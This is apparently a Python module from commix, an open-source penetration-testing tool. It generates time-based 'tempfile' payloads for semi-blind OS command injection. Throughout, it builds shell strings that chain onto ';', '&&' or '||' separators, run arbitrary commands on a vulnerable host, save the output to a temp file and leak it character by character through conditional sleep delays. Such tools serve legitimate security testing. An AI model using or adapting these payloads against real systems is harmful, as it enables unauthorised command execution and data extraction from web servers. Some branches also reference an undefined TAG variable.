#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import urllib

"""
  The "tempfile-based" technique on Semiblind-based OS Command Injection.
  The available "tempfile-based" payloads.
"""

# Tempfile-based decision payload (check if host is vulnerable).
def decision(seperator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method):
  if seperator == ";" :
    payload = (seperator + " "
	      "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + seperator + " "
	      "str=$(cat " + OUTPUT_TEXTFILE + ")" + seperator + " "
	      # Find the length of the output.
	      "str1=${#str}" + seperator + " "
	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + seperator  + " "
	      "then sleep 0" + seperator + " "
	      "else sleep " + str(delay) + seperator + " "
	      "fi "
	      )
    
  elif seperator == "&&" :
    if http_request_method == "POST":
      seperator = urllib.quote(seperator)
      ampersand = "%26"
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "sleep 0 " + seperator + " "
	      "str=$(echo "+ TAG + " > '" + OUTPUT_TEXTFILE + "') " + seperator + " "
	      "str=$(cat " + OUTPUT_TEXTFILE + ") " + seperator + " "
	      "str1=${#str} " + seperator + " "
	      "[ " + str(j) + " -eq ${str1} ] " + seperator + " "
	      "sleep " + str(delay)
	      )
    if http_request_method == "POST":
      seperator = urllib.unquote(seperator)

  elif seperator == "||" :
    payload = (seperator + " "
	      "echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
	      "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | wc -c) ] " + seperator + " "
	      "sleep " + str(delay)
	      )  
  else:
    pass

  return payload

# Tempfile-based decision payload (check if host is vulnerable).
#  __Warning__: This (alternative) python-shell is still experimental.
def decision_alter_shell(seperator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method):
  
  if seperator == ";" :
    payload = (seperator + " "
	      "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + seperator + " "
	      # Find the length of the output, using readline().
	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ seperator + " "
	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + seperator  + " "
	      "then $(python -c \"import time;time.sleep(0)\")"+ seperator + " "
	      "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ seperator + " "
	      "fi "
	      )

  elif seperator == "&&" :
    if http_request_method == "POST":
      seperator = urllib.quote(seperator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "$(python -c \"import time;time.sleep(0)\") " + seperator + " "
	      "str=$(echo "+ TAG + " > " + OUTPUT_TEXTFILE + ") " + seperator + " "
	      # Find the length of the output, using readline().
	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + seperator + " "
	      "[ " + str(j) + " -eq ${str1} ] " + seperator + " "
	      "$(python -c \"import time;time.sleep("+ str(delay) +")\") "
	      )
    if http_request_method == "POST":
      seperator = urllib.unquote(seperator)

  elif seperator == "||" :
    payload = (seperator + " "
	      "echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
	      # Find the length of the output, using readline().
	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + seperator + " "
	      "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
	      ) 
  else:
    pass
  
  return payload

# Execute shell commands on vulnerable host.
def cmd_execution(seperator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method):
  if seperator == ";" :
    payload = (seperator + " "
	      "str=$("+ cmd + " > " + OUTPUT_TEXTFILE + ")" + seperator + " "
	      "str=$(cat " + OUTPUT_TEXTFILE + ")" + seperator + " "
	      "str1=${#str}" + seperator +
	      "if [ \"" + str(j) + "\" != ${str1} ]; " +
	      "then sleep 0" + seperator +
	      "else sleep " + str(delay) + seperator +
	      "fi "
	      )
    
  elif seperator == "&&" :
    if http_request_method == "POST":
      seperator = urllib.quote(seperator)
      ampersand = "%26"
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "sleep 0 " + seperator + " "
	      "str=$(\""+cmd+"\" > " + OUTPUT_TEXTFILE +") " + seperator + " "
	      "str=$(cat " + OUTPUT_TEXTFILE + ")" + seperator + " "
	      # Find the length of the output.
	      "str1=${#str} " + seperator + " "
	      "[ " + str(j) + " -eq ${str1} ]" + seperator + " "
	      "sleep " + str(delay)
	      )
    if http_request_method == "POST":
      seperator = urllib.unquote(seperator)
    
  elif seperator == "||" :		
    payload = (seperator + " "
	      "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
	      "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | wc -c) ] " + seperator + " "
	      "sleep " + str(delay)
	      ) 		    
  else:
    pass
  
  return payload

# Execute shell commands on vulnerable host.
# __Warning__: This (alternative) python-shell is still experimental.
def cmd_execution_alter_shell(seperator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method):
  if seperator == ";" :
    payload = (seperator + " "
	      "str=$("+ cmd + "| tr '\n' ' ' > " + OUTPUT_TEXTFILE + ")" + seperator + " "
	      # Find the length of the output, using readline().
	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ seperator + " "
	      "if [ \"" + str(j) + "\" != ${str1} ]; " +
	      "then $(python -c \"import time;time.sleep(0)\")"+ seperator + " "
	      "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ seperator + " "
	      "fi "
	      )
    
  elif seperator == "&&" :
    if http_request_method == "POST":
      seperator = urllib.quote(seperator)
      ampersand = "%26"
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "$(python -c \"import time;time.sleep(0)\") " +  seperator + " "
	      "str=$(\""+cmd+"\" > " + OUTPUT_TEXTFILE +") " +  seperator + " "
	      # Find the length of the output, using readline().
	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " +  seperator + " "
	      "[ " + str(j) + " -eq ${str1} ] " +  seperator + " "
	      "$(python -c \"import time;time.sleep("+ str(delay) +")\") "
	      )
    if http_request_method == "POST":
      seperator = urllib.unquote(seperator)
    
  elif seperator == "||" :		
    payload = (seperator + " "
	      "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
	      # Find the length of the output, using readline().
	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + seperator + " "
	      "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
	      ) 		    
  else:
    pass

  return payload

# Get the execution ouput, of shell execution.
def get_char(seperator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method):
  if seperator == ";" :
    payload = (seperator + " "
	      "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + seperator +
	      "if [ \"" + str(ascii_char) + "\" != ${str} ]" + seperator +
	      "then sleep 0" + seperator +
	      "else sleep " + str(delay) + seperator +
	      "fi "
	      )
    
  elif seperator == "&&" :
    if http_request_method == "POST":
      seperator = urllib.quote(seperator)
      ampersand = "%26"
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "sleep 0 " +  seperator + " "
	      "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + seperator + " "
	      "[ " + str(ascii_char) + " -eq ${str} ] " +  seperator + " "
	      "sleep "+ str(delay)
	      )
    if http_request_method == "POST":
      seperator = urllib.unquote(seperator)
      
  elif seperator == "||" :
    payload = (seperator + " "
	      "echo '" + TAG + "' |"+
	      "[ \"" + str(ascii_char) + "\" -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + seperator + 
	      "sleep " + str(delay) + " "
	      )
  else:
    pass

  return payload

# Get the execution ouput, of shell execution.
# __Warning__: This (alternative) python-shell is still experimental.
def get_char_alter_shell(seperator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method):
  
  if seperator == ";" :
    payload = (seperator + " "
	      "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\")" + seperator +
	      "if [ \"" + str(ascii_char) + "\" != ${str} ]" + seperator +
	      "then $(python -c \"import time;time.sleep(0)\")"+ seperator + " "
	      "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ seperator + " "
	      "fi "
	      )
    
  elif seperator == "&&" :
    if http_request_method == "POST":
      seperator = urllib.quote(seperator)
      ampersand = "%26"
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "$(python -c \"import time;time.sleep(0)\") " +  seperator + " "
	      "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\") " +  seperator + " "
	      "[ " + str(ascii_char) + " -eq ${str} ] " +  seperator + " "
	      "$(python -c \"import time;time.sleep("+ str(delay) +")\")"
	      )
    if http_request_method == "POST":
      seperator = urllib.unquote(seperator)

  elif seperator == "||" :
    payload = (seperator + " "
	      "echo '" + TAG + "' |"+
	      "[ \"" + str(ascii_char) + "\" -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\") ] " + seperator + 
	      "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
	      )
    
  else:
    pass
  
  return payload